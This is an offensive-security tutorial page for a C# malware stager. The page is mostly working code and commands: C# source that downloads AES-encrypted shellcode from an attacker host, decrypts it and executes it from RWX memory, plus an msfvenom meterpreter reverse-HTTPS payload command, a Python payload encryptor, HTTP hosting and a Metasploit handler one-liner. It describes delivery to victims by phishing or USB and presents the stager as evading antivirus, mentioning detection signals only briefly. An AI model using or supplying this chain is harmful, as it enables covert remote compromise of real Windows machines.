# 07.02 C# Stager

> Drop a tiny C sharp downloader that pulls AES encrypted shellcode and runs it via delegate from RWX memory.

## Overview

A stager is a minimal first stage payload whose only job is to fetch a larger second stage from attacker infrastructure and execute it in memory. Because the on disk binary contains no shellcode and no offensive capability beyond an HTTP client plus AES decrypt, static AV and YARA rules rarely flag it. The C sharp variant compiles to a sub 20 KB managed PE that can be dropped via phishing macros, HTA, or USB. At runtime the stager downloads ciphertext, AES CBC decrypts with a hardcoded key and IV, allocates RWX memory with VirtualAlloc, copies shellcode in, and invokes it through a Marshal.GetDelegateForFunctionPointer thunk. Detection signals are the WebClient.DownloadData call paired with a VirtualAlloc PAGE EXECUTE READWRITE allocation in the same managed process and unusual outbound HTTP from a.NET assembly.

## Steps

- **Step 1** — Generate raw shellcode with msfvenom (or Cobalt Strike, Sliver, Havoc) targeting x64 windows.
- **Step 2** — AES CBC encrypt the shellcode with a 32 byte key and 16 byte IV using the python helper, host the resulting payload.bin on attacker HTTP.
- **Step 3** — Compile Stager.cs with csc.exe using /platform x64 and /unsafe flags producing a single Stager.exe.
- **Step 4** — Deliver Stager.exe by phishing or external drive, run on victim.
- **Step 5** — Stager downloads ciphertext, decrypts with hardcoded key IV, allocates RWX, copies bytes, invokes delegate.
- **Step 6** — Catch the staged beacon callback on Cobalt Strike, Sliver, or Metasploit listener.

## Commands

### Stager.cs program with AES helper appended

```csharp
using System;
using System.Net;
using System.Runtime.InteropServices;

class Stager
{
 [DllImport("kernel32.dll")]
 static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

 [UnmanagedFunctionPointer(CallingConvention.StdCall)]
 delegate void ShellcodeDelegate();

 static void Main()
 {
 string url = "http://<ATTACKER>/payload.bin";
 byte[] encrypted = new WebClient().DownloadData(url);

 byte[] key = new byte[]{0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,
 0x10,0x21,0x32,0x43,0x54,0x65,0x76,0x87,0x98,0xA9,0xBA,0xCB,0xDC,0xED,0xFE,0x0F};
 byte[] iv = new byte[]{0xAA,0xBB,0xCC,0xDD,0xEE,0xFF,0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99};

 byte[] shellcode = AesHelper.Decrypt(encrypted, key, iv);

 IntPtr mem = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
 Marshal.Copy(shellcode, 0, mem, shellcode.Length);

 ShellcodeDelegate run = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(mem, typeof(ShellcodeDelegate));
 run();
 }
}

using System.IO;
using System.Security.Cryptography;

public static class AesHelper
{
 public static byte[] Decrypt(byte[] data, byte[] key, byte[] iv)
 {
 using (Aes aes = Aes.Create())
 {
 aes.Key = key;
 aes.IV = iv;
 aes.Mode = CipherMode.CBC;
 aes.Padding = PaddingMode.PKCS7;
 using (var ms = new MemoryStream())
 using (var cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
 {
 cs.Write(data, 0, data.Length);
 cs.FlushFinalBlock();
 return ms.ToArray();
 }
 }
 }
}

```

### Compile to x64 Stager.exe

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /platform:x64 /unsafe /out:Stager.exe Stager.cs
```

### Generate stageless x64 reverse https shellcode with msfvenom

```bash
msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<ATTACKER> LPORT=443 -f raw -o shellcode.bin
```

### AES CBC encrypt shellcode.bin into payload.bin

```bash
#!/usr/bin/env python3
# pip install pycryptodome
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

key = bytes.fromhex('00112233445566778899AABBCCDDEEFF102132435465768798A9BACBDCEDFE0F')
iv = bytes.fromhex('AABBCCDDEEFF00112233445566778899')

with open('shellcode.bin','rb') as f:
 sc = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
enc = cipher.encrypt(pad(sc, AES.block_size))

with open('payload.bin','wb') as f:
 f.write(enc)
print(f'[+] wrote payload.bin ({len(enc)} bytes)')

```

### Host payload.bin on attacker HTTP server

```bash
python3 -m http.server 80 --directory /opt/payloads
```

```bash
msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST <ATTACKER>; set LPORT 443; set ExitOnSession false; exploit -j'
```
